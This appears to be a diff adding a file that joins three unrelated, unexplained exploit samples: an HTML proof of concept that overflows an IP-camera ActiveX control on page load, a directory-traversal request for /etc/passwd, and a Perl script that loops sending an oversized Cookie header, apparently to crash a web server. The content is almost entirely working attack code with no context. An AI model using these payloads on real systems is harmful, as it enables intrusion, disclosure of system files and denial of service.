@@ -1,0 +1,49 @@
+&lt;html&gt;
+&lt;head&gt;&lt;title&gt;IPcam POC&lt;/title&gt;
+&lt;script&gt;
+function Check(){
+     var bf1 = &#039;A&#039;;
+     while (bf1.length &lt;= 6144) bf1 = bf1 + &#039;A&#039;;
+     obj.connect(bf1,&quot;BBBB&quot;,&quot;CCCC&quot;);
+}
+&lt;/script&gt;
+&lt;/head&gt;
+&lt;body onload=&quot; Check();&quot;&gt;
+&lt;object classid=&quot;clsid:DD01C8CA-5DA0-4B01-9603-B7194E561D32&quot;
+id=&quot;obj&quot;&gt;
+&lt;/object&gt;
+&lt;/html&gt;&lt;/body&gt;
+
+GET /../../../../../../../../../../../../../etc/passwd
+
+#!/usr/bin/perl
+
+use LWP::UserAgent;
+
+while (1 == 1){
+
+$ua = new LWP::UserAgent;
+$ua-&gt;agent(&quot;Mozilla/5.0 (X11; U; Linux i686; en-US;
+rv:1.8.1.6)&quot;);
+
+$req = HTTP::Request-&gt;new(GET =&gt; &#039;http://www.example.com&#039;);
+$req-&gt;header(Accept =&gt;
+&quot;text/xml,application/xml,application/xhtml+xml,text/html
+;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5&quot;);
+$req-&gt;header(&quot;Keep-Alive&quot; =&gt; 0);
+$req-&gt;header(Connection =&gt; &quot;close&quot;);
+$req-&gt;header(&quot;If-Modified-Since&quot; =&gt; &quot;Mon, 12 Oct 2009
+02:06:34 GMT&quot;);
+$req-&gt;header(Cookie =&gt;
+&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;);
+my $res = $ua-&gt;request($req);
+
+}
